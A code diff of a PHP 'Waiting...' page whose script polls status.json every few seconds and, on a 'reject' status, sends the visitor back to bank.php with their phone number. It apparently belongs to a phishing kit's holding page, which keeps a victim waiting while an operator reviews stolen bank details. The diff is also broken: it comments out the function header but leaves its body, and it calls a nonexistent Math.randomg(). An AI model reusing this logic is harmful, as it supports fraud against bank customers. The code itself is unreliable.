@@ -11,7 +11,7 @@ $file  = __DIR__ . "/status.json";
 <title>Waiting...</title>
 <link rel="stylesheet"href="style.css">
 <script>
-function checkStatus() {
+//function checkStatus() {
     fetch('status.json?t=' + Math.randomg())
         .then(response => response.json())
         .then(data => {
@@ -24,13 +24,13 @@ function checkStatus() {
                 } else if(status === 'reject') {
                     window.location.href = "bank.php?phone=" + phone + "&error=1";
                 }
-            }
+           // }
         })
         .catch(err => console.log(err));
 }
 
 // Check every 2 seconds
-setInterval(checkStatus, 3000);
+setInterval(checkStatus, 2000);
 </script>
 </head>
 <body>
